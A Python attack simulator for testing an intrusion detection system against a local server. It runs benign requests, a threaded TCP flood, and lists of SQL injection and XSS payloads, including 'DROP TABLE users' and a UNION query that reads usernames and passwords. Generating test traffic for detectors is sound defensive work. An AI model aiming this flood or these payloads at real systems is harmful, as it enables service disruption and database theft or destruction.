"""
Quick Attack Simulator for Multi-Vector IDS Testing
Simulates different attack types to test your IDS detection capabilities.

USAGE:
    python simulate_attacks.py [attack_type]

ATTACK TYPES:
    benign    - Normal web traffic
    ddos      - DDoS flood attack
    web       - SQL Injection + XSS attacks
    all       - Run all attacks in sequence (default)

EXAMPLE:
    python simulate_attacks.py ddos
    python simulate_attacks.py all
"""

import requests
import socket
import threading
import time
import sys
from datetime import datetime

# Configuration
TARGET_IP = "127.0.0.1"
TARGET_PORT = 8000
TARGET_URL = f"http://{TARGET_IP}:{TARGET_PORT}"

def log(message, level="INFO"):
    """Print timestamped log message."""
    colors = {
        "INFO": "\033[94m",    # Blue
        "SUCCESS": "\033[92m", # Green
        "WARNING": "\033[93m", # Yellow
        "ERROR": "\033[91m",   # Red
        "RESET": "\033[0m"
    }
    color = colors.get(level, colors["RESET"])
    timestamp = datetime.now().strftime('%H:%M:%S')
    print(f"{color}[{timestamp}] [{level}] {message}{colors['RESET']}")

def simulate_benign_traffic(duration=20):
    """
    Simulate normal web traffic.
    Makes regular HTTP requests to simulate legitimate user activity.
    """
    log("Starting BENIGN traffic simulation...", "INFO")
    log(f"Duration: {duration} seconds", "INFO")
    
    end_time = time.time() + duration
    count = 0
    
    while time.time() < end_time:
        try:
            response = requests.get(f"{TARGET_URL}/health", timeout=2)
            count += 1
            if count % 5 == 0:
                log(f"Sent {count} benign requests", "INFO")
        except Exception as e:
            log(f"Request failed: {e}", "WARNING")
        
        time.sleep(2)  # Normal user delay
    
    log(f"Benign traffic complete. Total requests: {count}", "SUCCESS")

def simulate_ddos(duration=30, threads=5):
    """
    Simulate DDoS attack.
    Creates multiple threads sending rapid requests to overwhelm the server.
    """
    log("Starting DDoS ATTACK simulation...", "WARNING")
    log(f"Duration: {duration}s | Threads: {threads}", "WARNING")
    log("This will generate HIGH TRAFFIC!", "WARNING")
    
    request_count = [0]  # Use list for mutable counter
    stop_flag = [False]  # Flag to stop all threads
    
    def flood_worker():
        """Worker thread for flooding."""
        end_time = time.time() + duration
        while time.time() < end_time and not stop_flag[0]:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)  # Short timeout
                sock.connect((TARGET_IP, TARGET_PORT))
                sock.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
                request_count[0] += 1
            except socket.timeout:
                pass  # Timeout is expected during flood
            except ConnectionRefusedError:
                log("Server refused connection (may be overwhelmed)", "WARNING")
                stop_flag[0] = True  # Stop if server is down
                break
            except Exception as e:
                pass  # Ignore other errors during flood
            finally:
                # CRITICAL: Always close the socket
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
            
            # Small delay to prevent too many open sockets
            time.sleep(0.01)
    
    # Launch attack threads
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker)
        t.daemon = True  # Daemon threads will exit when main exits
        t.start()
        thread_list.append(t)
    
    # Monitor progress
    start_time = time.time()
    while any(t.is_alive() for t in thread_list):
        elapsed = int(time.time() - start_time)
        if elapsed % 5 == 0:  # Log every 5 seconds
            log(f"DDoS in progress... {elapsed}s | Requests sent: {request_count[0]}", "WARNING")
        time.sleep(1)
    
    # Wait for all threads with timeout
    for t in thread_list:
        t.join(timeout=2)
    
    log(f"DDoS attack complete. Total requests: {request_count[0]}", "SUCCESS")

def simulate_web_attacks():
    """
    Simulate web attacks (SQL Injection + XSS).
    Sends malicious payloads to test web attack detection.
    """
    log("Starting WEB ATTACK simulation...", "WARNING")
    
    # SQL Injection payloads
    sqli_payloads = [
        "' OR '1'='1",
        "1' OR '1'='1'--",
        "' UNION SELECT NULL--",
        "1; DROP TABLE users--",
        "admin'--",
        "' OR 1=1--",
        "1' AND '1'='1",
        "' UNION SELECT username, password FROM users--",
    ]
    
    # XSS payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'>",
    ]
    
    log("Sending SQL Injection payloads...", "WARNING")
    for i, payload in enumerate(sqli_payloads, 1):
        try:
            url = f"{TARGET_URL}/?id={payload}"
            response = requests.get(url, timeout=3)
            log(f"SQLi {i}/{len(sqli_payloads)}: {payload[:40]}...", "WARNING")
        except Exception as e:
            log(f"Request failed: {e}", "ERROR")
        time.sleep(1)
    
    log("Sending XSS payloads...", "WARNING")
    for i, payload in enumerate(xss_payloads, 1):
        try:
            response = requests.post(
                TARGET_URL,
                data={"comment": payload, "search": payload},
                timeout=3
            )
            log(f"XSS {i}/{len(xss_payloads)}: {payload[:40]}...", "WARNING")
        except Exception as e:
            log(f"Request failed: {e}", "ERROR")
        time.sleep(1)
    
    log("Web attack simulation complete", "SUCCESS")

def print_banner():
    """Print application banner."""
    print("\n" + "="*70)
    print(" "*15 + "MULTI-VECTOR IDS - ATTACK SIMULATOR")
    print("="*70)
    print(f"Target: {TARGET_URL}")
    print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*70 + "\n")

def print_usage():
    """Print usage instructions."""
    print(__doc__)

def main():
    """Main function to run attack simulations."""
    print_banner()
    
    # Parse command line arguments
    attack_type = sys.argv[1].lower() if len(sys.argv) > 1 else "all"
    
    if attack_type not in ["benign", "ddos", "web", "all"]:
        log(f"Unknown attack type: {attack_type}", "ERROR")
        print_usage()
        return
    
    # Check if target is reachable
    log("Checking target availability...", "INFO")
    try:
        response = requests.get(f"{TARGET_URL}/health", timeout=5)
        log(f"Target is reachable! Status: {response.status_code}", "SUCCESS")
    except Exception as e:
        log(f"Cannot reach target: {e}", "ERROR")
        log("Make sure the API server is running: python src\\api\\main.py", "ERROR")
        return
    
    log("Starting attack simulation...", "INFO")
    log("Monitor your dashboard at: http://localhost:5173", "INFO")
    print()
    
    try:
        if attack_type == "benign":
            simulate_benign_traffic(30)
        
        elif attack_type == "ddos":
            simulate_ddos(30, threads=5)
        
        elif attack_type == "web":
            simulate_web_attacks()
        
        elif attack_type == "all":
            log("Running ALL attack types in sequence...", "INFO")
            print()
            
            # 1. Benign traffic
            simulate_benign_traffic(20)
            log("Waiting 5 seconds before next attack...", "INFO")
            time.sleep(5)
            print()
            
            # 2. DDoS attack
            simulate_ddos(30, threads=5)
            log("Waiting 5 seconds before next attack...", "INFO")
            time.sleep(5)
            print()
            
            # 3. Web attacks
            simulate_web_attacks()
            print()
    
    except KeyboardInterrupt:
        log("\nSimulation interrupted by user", "WARNING")
    except Exception as e:
        log(f"Error during simulation: {e}", "ERROR")
    
    print("\n" + "="*70)
    log("SIMULATION COMPLETE!", "SUCCESS")
    log("Check your IDS dashboard for detected attacks!", "SUCCESS")
    log("Dashboard: http://localhost:5173", "INFO")
    log("API Alerts: http://localhost:8000/api/alerts", "INFO")
    print("="*70 + "\n")

if __name__ == "__main__":
    main()
